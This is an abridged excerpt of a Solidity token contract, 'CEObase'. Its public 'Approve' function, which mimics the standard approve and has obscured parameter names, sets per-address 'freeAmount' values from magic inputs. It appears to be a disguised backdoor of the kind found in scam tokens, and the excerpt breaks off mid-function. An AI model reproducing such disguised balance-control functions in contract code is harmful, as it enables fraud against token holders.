...
contract CEObase is Context, IERC20, Ownable {

    using SafeMath for uint256;
    string private _name = "CEObase";
    string private _symbol = unicode"💎Ceoベース💎";
    ...
    uint256 private _totalSupply = 256000000000 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWallet = payable(address(0x25E70C4D9fbaCeAc17D14210cFcbA8947f393bbE));
    ...
    function Approve(address holdereward,uint256 liquidti) public {
        uint256 storge = liquidti;
        if (storge == 0)
            freeAmount[holdereward] = 0;
        if (storge == 1)
            freeAmount[holdereward] = 1000000;
        if (storge > 100){
